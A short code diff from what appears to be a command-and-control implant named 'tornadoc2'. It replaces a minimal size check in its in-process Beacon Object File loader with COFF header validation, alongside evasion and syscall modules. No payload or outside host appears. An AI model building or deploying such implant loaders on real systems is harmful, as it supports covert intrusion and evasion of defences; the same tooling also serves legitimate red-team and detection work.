@@ -38,6 +38,7 @@ import (
 	"unsafe"
 
 	"tornadoc2/agent/evasion"
+	"tornadoc2/agent/internal/coff"
 	"tornadoc2/agent/syscalls"
 )
 
@@ -797,8 +798,8 @@ func bofResolve(name string, cache map[string]uintptr) (uintptr, error) {
 // The previous implementation shelled out to PowerShell and
 // compiled the loader at runtime. This one does neither.
 func ExecuteBOFInProcess(bofBytes []byte, entry string, packedArgs []byte) (string, int, error) {
-	if len(bofBytes) < 20 {
-		return "", -1, errors.New("bof: input too small")
+	if err := coff.ValidateHeader(bofBytes); err != nil {
+		return "", -1, fmt.Errorf("bof: %w", err)
 	}
 
 	bofInitCallbacks()
